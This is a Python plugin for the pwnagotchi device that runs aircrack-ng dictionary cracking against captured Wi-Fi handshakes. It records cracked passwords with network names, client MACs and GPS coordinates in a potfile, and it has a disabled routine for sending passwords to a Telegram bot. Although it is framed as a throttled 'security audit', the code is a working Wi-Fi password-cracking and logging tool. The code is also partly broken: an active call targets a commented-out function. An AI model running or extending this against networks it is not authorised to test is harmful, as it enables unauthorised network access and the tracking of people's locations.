from pwnagotchi import plugins
import logging
import subprocess
import string
import re
import io
import os
import time
import json
from datetime import datetime

# This plugin is a modified version of the quickdic plugin.
# It is throttled to prevent it from using too much CPU. (built for pi zero 2w)
# It logs the security audit of estimated password strength to a file.
# It emits the cracked event for display-password.py to display the password on the screen.
# It sends the found passwords as qrcode and plain text over to telegram bot. (optional)
# Original quickdic plugin by ??? let me know if you know who the original author is. This is so 
# modified that it's essentially new code, but I will attribute if asked.
# Plugin will cycle through as many .txt files as you have in your wordlists/ starting with the 3 primary 
# files you set in your config.toml then it moves 3 files at a time, smallest to largest, with a 3 second wait between files.
# As a tool and for education, it also scores password strength based on how fast it was cracked if at all.
# I built it to run through large .txt files without spiking the cpu to 100%. Enjoy!

class QuickDic(plugins.Plugin):
    __author__ = 'ZeroDumb'
    __version__ = '1.1.4'
    __license__ = 'GPL3'
    __description__ = 'Run a quick dictionary scan against captured handshakes, display password on screen using display-password.py. Optionally send found passwords as qrcode and plain text over to telegram bot.'
    __dependencies__ = {
        'apt': ['aircrack-ng'],
    }
    __defaults__ = {
        'enabled': True,
        'wordlist_folder': '/home/pi/wordlists/',
        'face': '(·ω·)',
        'api': None,
        'id': None,
        'max_cpu_percent': 80,  # Maximum CPU usage percentage
        'wordlists_per_batch': 3,  # Number of wordlists to process at once
        'batch_delay': 3,  # Delay between batches in seconds
        'priority_wordlists': ['rockyou-75.txt', 'darkc0de.txt', 'john-the-ripper.txt'],  # Most common wordlists first
        'security_log': '/home/pi/security_audit.log',
        'potfile_path': '/home/pi/handshakes/quickdic.cracked.potfile'
    }

    def __init__(self):
        self.text_to_set = ""
        self.current_batch = 0
        self.is_cracking = False
        self.start_time = None
        self.attempted_wordlists = set()
        self.total_passwords_checked = 0
        self.processed_files = set()  # Track processed handshake files
        self.processed_files_log = '/home/pi/handshakes/quickdic_processed_files.log'

    def on_loaded(self):
        logging.info('[quickdic_throttled] plugin loaded')

        if 'face' not in self.options:
            self.options['face'] = '(·ω·)'
        if 'wordlist_folder' not in self.options:
            self.options['wordlist_folder'] = '/home/pi/wordlists/'
        if 'enabled' not in self.options:
            self.options['enabled'] = False
        if 'api' not in self.options:
            self.options['api'] = None
        if 'id' not in self.options:
            self.options['id'] = None
        if 'max_cpu_percent' not in self.options:
            self.options['max_cpu_percent'] = 80
        if 'wordlists_per_batch' not in self.options:
            self.options['wordlists_per_batch'] = 5
        if 'batch_delay' not in self.options:
            self.options['batch_delay'] = 3
        if 'priority_wordlists' not in self.options:
            self.options['priority_wordlists'] = ['rockyou-75.txt', 'darkc0de.txt', 'john-the-ripper.txt']
        if 'security_log' not in self.options:
            self.options['security_log'] = '/home/pi/security_audit.log'
        if 'potfile_path' not in self.options:
            self.options['potfile_path'] = '/home/pi/handshakes/quickdic.cracked.potfile'
            
        # Debug: Log current configuration
        logging.info(f'[quickdic] Current options: {self.options}')
        logging.info(f'[quickdic] Priority wordlists from config: {self.options.get("priority_wordlists", "NOT SET")}')
            
        # Check aircrack-ng installation
        check = subprocess.run(
            ('/usr/bin/dpkg -l aircrack-ng | grep aircrack-ng | awk \'{print $2, $3}\''), 
            shell=True, 
            stdout=subprocess.PIPE)
        check = check.stdout.decode('utf-8').strip()
        if check != "aircrack-ng <none>":
            logging.info('[quickdic] Found %s' %check)
        else:
            logging.warning('[quickdic] aircrack-ng is not installed!')

        # Load wordlists
        self._load_wordlists()
        
        # Load previously processed files
        self._load_processed_files()

    def on_config_changed(self, config):
        """Called when configuration changes"""
        # Update options from config
        if 'quickdic_throttled' in config['main']['plugins']:
            plugin_config = config['main']['plugins']['quickdic_throttled']
            for key, value in plugin_config.items():
                self.options[key] = value
            
            # Reload wordlists with new configuration
            self._load_wordlists()
            logging.info('[quickdic] Configuration updated, reloaded wordlists')

    def _load_wordlists(self):
        """Load and sort wordlists based on current configuration"""
        try:
            all_wordlists = [f for f in os.listdir(self.options['wordlist_folder']) if f.endswith('.txt')]
            
            # Sort wordlists: priority first, then by size (smallest first)
            priority_set = set(self.options['priority_wordlists'])
            priority_wordlists = [wl for wl in all_wordlists if wl in priority_set]
            other_wordlists = [wl for wl in all_wordlists if wl not in priority_set]
            
            # Sort other wordlists by size
            other_wordlists.sort(key=lambda x: os.path.getsize(os.path.join(self.options['wordlist_folder'], x)))
            
            self.wordlists = priority_wordlists + other_wordlists
            logging.info(f'[quickdic] Found {len(self.wordlists)} wordlists')
            logging.info(f'[quickdic] Priority wordlists: {", ".join(priority_wordlists)}')
            logging.info(f'[quickdic] Other wordlists: {len(other_wordlists)} files')
            
        except Exception as e:
            logging.error(f'[quickdic] Error listing wordlists: {str(e)}')
            self.wordlists = []

    def _load_processed_files(self):
        """Load list of previously processed files from log"""
        try:
            if os.path.exists(self.processed_files_log):
                with open(self.processed_files_log, 'r') as f:
                    for line in f:
                        filename = line.strip()
                        if filename:
                            self.processed_files.add(filename)
                logging.info(f'[quickdic] Loaded {len(self.processed_files)} previously processed files')
            else:
                logging.info('[quickdic] No processed files log found, starting fresh')
        except Exception as e:
            logging.error(f'[quickdic] Error loading processed files: {str(e)}')

    def _save_processed_file(self, filename):
        """Save a processed file to the log"""
        try:
            with open(self.processed_files_log, 'a') as f:
                f.write(f'{filename}\n')
            self.processed_files.add(filename)
            logging.info(f'[quickdic] Marked {filename} as processed')
        except Exception as e:
            logging.error(f'[quickdic] Error saving processed file: {str(e)}')

    def _is_file_processed(self, filename):
        """Check if a file has already been processed"""
        return filename in self.processed_files

    def _get_current_cpu_usage(self):
        """Get current CPU usage percentage using top command"""
        try:
            cmd = "top -bn1 | grep 'Cpu(s)' | awk '{print $2}'"
            result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE)
            cpu_usage = float(result.stdout.decode('utf-8').strip())
            return cpu_usage
        except Exception as e:
            logging.error(f'[quickdic] Error getting CPU usage: {str(e)}')
            return 0

    def _get_wordlist_size(self, wordlist):
        """Get number of lines in wordlist"""
        try:
            cmd = f"wc -l {os.path.join(self.options['wordlist_folder'], wordlist)}"
            result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE)
            return int(result.stdout.decode('utf-8').split()[0])
        except:
            return 0

    def _log_security_audit(self, filename, bssid, result, time_taken, wordlists_checked):
        """Log security audit results"""
        try:
            audit_data = {
                'timestamp': datetime.now().isoformat(),
                'bssid': bssid,
                'result': result,
                'time_taken': time_taken,
                'wordlists_checked': wordlists_checked,
                'total_passwords_checked': self.total_passwords_checked,
                'security_score': self._calculate_security_score(result, time_taken, wordlists_checked)
            }
            
            with open(self.options['security_log'], 'a') as f:
                f.write(json.dumps(audit_data) + '\n')
                
            logging.info(f'[quickdic] Security audit logged to {self.options["security_log"]}')
        except Exception as e:
            logging.error(f'[quickdic] Error logging security audit: {str(e)}')

    def _calculate_security_score(self, result, time_taken, wordlists_checked):
        """Calculate a security score based on cracking attempt results"""
        if result == "KEY NOT FOUND":
            # Password wasn't found in the attempted wordlists
            base_score = 80
            
            # Bonus for time taken
            if time_taken > 3600:  # More than 1 hour
                base_score += 15
            elif time_taken > 1800:  # More than 30 minutes
                base_score += 10
            elif time_taken > 900:  # More than 15 minutes
                base_score += 5
                
            # Bonus for number of wordlists checked
            if wordlists_checked > 500:
                base_score += 15
            elif wordlists_checked > 300:
                base_score += 10
            elif wordlists_checked > 100:
                base_score += 5
                
            return min(100, base_score)
        else:
            # Password was found
            return 0

    def _process_wordlist_batch(self, filename, bssid, wordlist_batch):
        """Process a batch of wordlists"""
        wordlist_paths = [os.path.join(self.options['wordlist_folder'], wl) for wl in wordlist_batch]
        wordlist_str = ','.join(wordlist_paths)
        
        # Count passwords in this batch
        for wl in wordlist_batch:
            if wl not in self.attempted_wordlists:
                self.total_passwords_checked += self._get_wordlist_size(wl)
                self.attempted_wordlists.add(wl)
        
        cmd = f'aircrack-ng -w {wordlist_str} -l {filename}.cracked -q -b {bssid} {filename} | grep KEY'
        logging.info(f'[quickdic] Processing batch: {", ".join(wordlist_batch)}')
        
        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE)
        return result.stdout.decode('utf-8').strip()

    def _parse_gps_data(self, filename):
        """Parse GPS data from associated .gps.json or .geo.json files"""
        gps_data = {'lat': '', 'lon': '', 'alt': ''}
        
        # Try to find GPS data files
        base_path = os.path.splitext(filename)[0]
        gps_files = [
            f"{base_path}.gps.json",
            f"{base_path}.geo.json"
        ]
        
        for gps_file in gps_files:
            if os.path.exists(gps_file):
                try:
                    with open(gps_file, 'r') as f:
                        gps_info = json.load(f)
                        
                    # Handle different GPS file formats
                    if 'lat' in gps_info and 'lon' in gps_info:
                        gps_data['lat'] = str(gps_info['lat'])
                        gps_data['lon'] = str(gps_info['lon'])
                        if 'alt' in gps_info:
                            gps_data['alt'] = str(gps_info['alt'])
                    elif 'latitude' in gps_info and 'longitude' in gps_info:
                        gps_data['lat'] = str(gps_info['latitude'])
                        gps_data['lon'] = str(gps_info['longitude'])
                        if 'altitude' in gps_info:
                            gps_data['alt'] = str(gps_info['altitude'])
                            
                    logging.info(f'[quickdic] Found GPS data: {gps_data}')
                    break
                except Exception as e:
                    logging.debug(f'[quickdic] Error parsing GPS file {gps_file}: {str(e)}')
                    continue
        
        return gps_data

    def _extract_network_info(self, filename, bssid):
        """Extract network information from the pcap file or associated files"""
        network_info = {'ssid': '', 'station_mac': ''}
        
        # Try to get SSID from aircrack-ng output
        try:
            cmd = f'aircrack-ng {filename} | grep -E "ESSID|SSID" | head -1'
            result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if result.stdout:
                # Parse SSID from output
                output = result.stdout.decode('utf-8')
                ssid_match = re.search(r'ESSID:\s*"([^"]*)"', output)
                if ssid_match:
                    network_info['ssid'] = ssid_match.group(1)
        except Exception as e:
            logging.debug(f'[quickdic] Error extracting SSID: {str(e)}')
        
        # Try to get station MAC from aircrack-ng output
        try:
            cmd = f'aircrack-ng {filename} | grep -E "Station" | head -1'
            result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if result.stdout:
                output = result.stdout.decode('utf-8')
                # Extract station MAC (format: Station MAC: XX:XX:XX:XX:XX:XX)
                mac_match = re.search(r'Station MAC:\s*([0-9A-Fa-f:]{17})', output)
                if mac_match:
                    network_info['station_mac'] = mac_match.group(1)
        except Exception as e:
            logging.debug(f'[quickdic] Error extracting station MAC: {str(e)}')
        
        return network_info

    def _write_to_potfile(self, bssid, password, filename):
        """Write cracked password to potfile with GPS data"""
        try:
            # Extract network information
            network_info = self._extract_network_info(filename, bssid)
            ssid = network_info['ssid'] or 'Unknown'
            station_mac = network_info['station_mac'] or 'Unknown'
            
            # Parse GPS data
            gps_data = self._parse_gps_data(filename)
            
            # Create potfile entry
            timestamp = datetime.now().isoformat()
            potfile_entry = f"{bssid}:{station_mac}:{ssid}:{password}:{gps_data['lat']}:{gps_data['lon']}:{gps_data['alt']}:{timestamp}\n"
            
            # Write to potfile
            with open(self.options['potfile_path'], 'a') as f:
                f.write(potfile_entry)
            
            logging.info(f'[quickdic] Added to potfile: {bssid}:{ssid}:{password}')
            
        except Exception as e:
            logging.error(f'[quickdic] Error writing to potfile: {str(e)}')

    def on_handshake(self, agent, filename, access_point, client_station):
        if self.is_cracking:
            logging.info('[quickdic] Already processing a handshake, skipping')
            return

        self.is_cracking = True
        self.start_time = time.time()
        display = agent.view()
        logging.info(f'[quickdic] Processing handshake file: {filename}')
        
        try:
            # Verify handshake
            result = subprocess.run(
                ('/usr/bin/aircrack-ng ' + filename + ' | grep "1 handshake" | awk \'{print $2}\''),
                shell=True, 
                stdout=subprocess.PIPE)
            result = result.stdout.decode('utf-8').translate({ord(c): None for c in string.whitespace})
            
            if not result:
                logging.info('[quickdic] No handshake found in file')
                self.is_cracking = False
                return

            logging.info(f'[quickdic] Handshake confirmed for BSSID: {result}')
            
            # Process wordlists in batches
            batch_size = self.options['wordlists_per_batch']
            total_wordlists = len(self.wordlists)
            wordlists_checked = 0
            
            for i in range(0, total_wordlists, batch_size):
                # Check CPU usage
                while self._get_current_cpu_usage() > self.options['max_cpu_percent']:
                    logging.info(f'[quickdic] CPU usage too high, waiting...')
                    time.sleep(5)
                
                # Get current batch of wordlists
                current_batch = self.wordlists[i:i + batch_size]
                wordlists_checked += len(current_batch)
                
                progress = (i + len(current_batch)) / total_wordlists * 100
                logging.info(f'[quickdic] Progress: {progress:.1f}% ({wordlists_checked}/{total_wordlists} wordlists)')
                
                # Process batch
                result2 = self._process_wordlist_batch(filename, result, current_batch)
                logging.info(f'[quickdic] Batch result: {result2}')
                
                if result2 != "KEY NOT FOUND":
                    key = re.search(r'\[(.*)\]', result2)
                    pwd = str(key.group(1))
                    self.text_to_set = "Cracked password: " + pwd
                    logging.warning(f'[quickdic] Password found: {pwd}')
                    display.set('face', self.options['face'])
                    display.set('status', self.text_to_set)
                    self.text_to_set = ""
                    display.update(force=True)
                    
                    # Write to potfile with GPS data
                    self._write_to_potfile(result, pwd, filename)
                    
                    # Emit cracked event for display-password.py
                    plugins.on('cracked', access_point, pwd)
                    
                    if self.options['id'] != None and self.options['api'] != None:
                        self._send_message(filename, pwd)
                    break
                
                # Wait between batches
                if i + batch_size < total_wordlists:
                    logging.info(f'[quickdic] Waiting {self.options["batch_delay"]} seconds before next batch')
                    time.sleep(self.options['batch_delay'])
            
            # Log security audit
            time_taken = time.time() - self.start_time
            self._log_security_audit(filename, result, result2, time_taken, wordlists_checked)
            
            if result2 == "KEY NOT FOUND":
                logging.info('[quickdic] No password found in any wordlist')
                
        except Exception as e:
            logging.error(f'[quickdic] Error during cracking: {str(e)}')
        finally:
            self.is_cracking = False

    def on_webhook(self, path, request):
        """Webhook to manually trigger processing of existing handshakes"""
        from flask import make_response, jsonify, render_template_string
        
        # Debug: Log the exact path being called
        logging.info(f'[quickdic] Webhook called with path: "{path}" (type: {type(path)})')
        
        # Handle root path, process_handshakes path, and web UI path
        if path == "process_handshakes" or path == "" or path == "/" or path is None:
            try:
                # Get handshake directory from config
                handshake_dir = "/home/pi/handshakes"
                pcap_files = [f for f in os.listdir(handshake_dir) if f.endswith('.pcap')]
                
                if not pcap_files:
                    # Return HTML for web UI
                    if path == "" or path == "/" or path is None:
                        html = """
                        <html>
                        <head><title>QuickDic Throttled</title></head>
                        <body>
                            <h2>QuickDic Throttled Plugin</h2>
                            <p style="color: red;">No handshake files found in /home/pi/handshakes/</p>
                            <p>Make sure you have .pcap files in the handshakes directory.</p>
                        </body>
                        </html>
                        """
                        return make_response(html, 200, {'Content-Type': 'text/html'})
                    else:
                        return make_response(jsonify({"status": "error", "message": "No handshake files found"}), 404)
                
                # Sort pcap files by modification time (oldest first)
                pcap_files.sort(key=lambda x: os.path.getmtime(os.path.join(handshake_dir, x)))
                
                # Filter out already processed files
                unprocessed_files = [f for f in pcap_files if not self._is_file_processed(f)]
                
                if not unprocessed_files:
                    # Return HTML for web UI
                    if path == "" or path == "/" or path is None:
                        html = f"""
                        <html>
                        <head><title>QuickDic Throttled</title></head>
                        <body>
                            <h2>QuickDic Throttled Plugin</h2>
                            <p style="color: orange;">All {len(pcap_files)} handshake files have already been processed!</p>
                            <p>To reprocess files, delete: <code>{self.processed_files_log}</code></p>
                            <p><a href="/plugins/quickdic_throttled/process_handshakes">Check Again</a></p>
                        </body>
                        </html>
                        """
                        return make_response(html, 200, {'Content-Type': 'text/html'})
                    else:
                        return make_response(jsonify({"status": "info", "message": "All files already processed"}), 200)
                
                # Process the oldest unprocessed handshake file
                handshake_file = os.path.join(handshake_dir, unprocessed_files[0])
                logging.info(f'[quickdic] Manually triggered processing of {handshake_file} (oldest unprocessed of {len(unprocessed_files)} unprocessed files)')
                
                # Mark file as processed before starting
                self._save_processed_file(unprocessed_files[0])
                
                # Simulate handshake event
                from pwnagotchi import plugins
                # Create a minimal access_point object to prevent auto-tune plugin errors
                access_point = {
                    'channel': 1,  # Default channel
                    'ssid': 'Unknown',
                    'bssid': 'Unknown'
                }
                plugins.on('handshake', None, handshake_file, access_point, None)
                
                # Return HTML for web UI or JSON for API
                if path == "" or path == "/" or path is None:
                    html = f"""
                    <html>
                    <head><title>QuickDic Throttled</title></head>
                    <body>
                        <h2>QuickDic Throttled Plugin</h2>
                        <p style="color: green;">Processing handshake: {unprocessed_files[0]}</p>
                        <p>Found {len(pcap_files)} handshake files total ({len(unprocessed_files)} unprocessed).</p>
                        <p>Check the logs for progress: <code>tail -f /etc/pwnagotchi/log/pwnagotchi.log | grep quickdic</code></p>
                        <p><a href="/plugins/quickdic_throttled/process_handshakes">Process Next Handshake</a></p>
                    </body>
                    </html>
                    """
                    return make_response(html, 200, {'Content-Type': 'text/html'})
                else:
                    return make_response(jsonify({
                        "status": "success", 
                        "message": f"Processing {unprocessed_files[0]}",
                        "files_found": len(pcap_files),
                        "unprocessed_files": len(unprocessed_files)
                    }), 200)
                
            except Exception as e:
                logging.error(f'[quickdic] Error in webhook: {str(e)}')
                if path == "" or path == "/" or path is None:
                    html = f"""
                    <html>
                    <head><title>QuickDic Throttled</title></head>
                    <body>
                        <h2>QuickDic Throttled Plugin</h2>
                        <p style="color: red;">Error: {str(e)}</p>
                        <p>Check the logs for more details.</p>
                    </body>
                    </html>
                    """
                    return make_response(html, 500, {'Content-Type': 'text/html'})
                else:
                    return make_response(jsonify({"status": "error", "message": str(e)}), 500)
        
        logging.warning(f'[quickdic] Invalid webhook path: "{path}"')
        return make_response(jsonify({"status": "error", "message": "Invalid endpoint"}), 404)

#    def _send_message(self, filename, password):
#        """Send cracked password to Telegram bot"""
#        try:
#            import requests
#            
#            # Create message with password and file info
#            message = f"🔓 Password Cracked!\n\n"
#            message += f"📁 File: {os.path.basename(filename)}\n"
#            message += f"🔑 Password: {password}\n"
#            message += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
#            
#            # Send to Telegram
#            url = f"https://api.telegram.org/bot{self.options['api']}/sendMessage"
#            data = {
#                'chat_id': self.options['id'],
#                'text': message,
#                'parse_mode': 'HTML'
#            }
#            
#            response = requests.post(url, data=data)
#            if response.status_code == 200:
#                logging.info(f'[quickdic] Password sent to Telegram: {password}')
#            else:
#                logging.error(f'[quickdic] Failed to send to Telegram: {response.text}')
#                
#        except Exception as e:
#            logging.error(f'[quickdic] Error sending to Telegram: {str(e)}') 